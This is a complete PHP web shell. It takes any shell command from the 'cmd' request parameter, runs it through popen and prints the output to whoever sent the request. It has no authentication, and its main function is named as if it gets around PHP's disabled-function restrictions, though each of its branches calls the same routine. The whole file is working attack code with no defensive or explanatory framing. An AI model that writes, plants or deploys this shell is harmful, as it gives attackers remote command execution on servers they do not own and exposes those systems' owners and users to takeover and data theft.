<?php
function bypass_disable_functions($cmd) {
    if (FALSE !== strpos($cmd, 'exec')) {
        $html = '<pre>' . execute($cmd) . '</pre>';
    }
    elseif (FALSE !== strpos($cmd, 'system')) {
        $html = '<pre>' . execute($cmd) . '</pre>';
    }
    elseif (FALSE !== strpos($cmd, 'shell_exec')) {
        $html = '<pre>' . execute($cmd) . '</pre>';
    }
    elseif (FALSE !== strpos($cmd, 'passthru')) {
        $html = '<pre>' . execute($cmd) . '</pre>';
    }
    else {
        $html = '<pre>' . execute($cmd) . '</pre>';
    }
    return $html;
}
function execute($com) {
    $arr = array();
    if (preg_match("/.*? &/", $com)) {
        $com = str_replace(" &", "", $com);
        $com = $com . " 2>&1 &";
        $handle = popen($com, 'r');
        while (!feof($handle)) {
            $buffer = fgets($handle);
            array_push($arr, $buffer);
        }
        pclose($handle);
    }
    else {
        $com = $com . " 2>&1 &";
        $handle = popen($com, 'r');
        while (!feof($handle)) {
            $buffer = fgets($handle);
            array_push($arr, $buffer);
        }
        pclose($handle);
    }
    return join("\n", $arr);
}
if (isset($_REQUEST['cmd'])) {
    echo bypass_disable_functions($_REQUEST['cmd']);
}
?>
